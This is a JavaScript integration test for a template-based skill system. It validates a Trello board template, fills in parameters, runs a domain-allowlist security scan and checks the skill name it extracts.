// -----------------------------------------------------------------------------
// Full Round-Trip: validate template -> assemble -> scan -> extract name
// -----------------------------------------------------------------------------

test('TC-SF-INT-050: Full round-trip — template validate, assemble, scan, extract name', () => {
  const loader = new TemplateLoader({ ncRequestManager: {} });
  const activator = new SkillActivator({
    ncRequestManager: {},
    securityScanner: scanner,
  });

  // 1. Validate template
  const templateValidation = loader.validate(TRELLO_TEMPLATE);
  assert.strictEqual(templateValidation.valid, true);

  // 2. Assemble with parameters
  const params = { board_name: 'My Great Board', board_id: 'xYz12345' };
  const { content, metadata } = engine.assemble(TRELLO_TEMPLATE, params);
  assert.ok(content.length > 0);

  // 3. Security scan (include NC domain as real deployment would)
  const scanConfig = {
    allowed_domains: [...TRELLO_TEMPLATE.security.allowed_domains, 'nc.example.com'],
  };
  const scanResult = scanner.scan(content, scanConfig);
  assert.strictEqual(scanResult.safe, true, `Violations: ${scanResult.violations.join(', ')}`);

  // 4. Extract skill name (as activator would)
  const skillName = activator.extractSkillName(content);
  assert.strictEqual(skillName, 'trello-my-great-board');

  // 5. Verify the full chain produced coherent output
  assert.ok(content.includes('name: trello-my-great-board'));
  assert.ok(content.includes('My Great Board'));
  assert.ok(content.includes('xYz12345'));
  assert.strictEqual(metadata.template_id, 'trello-board');
});

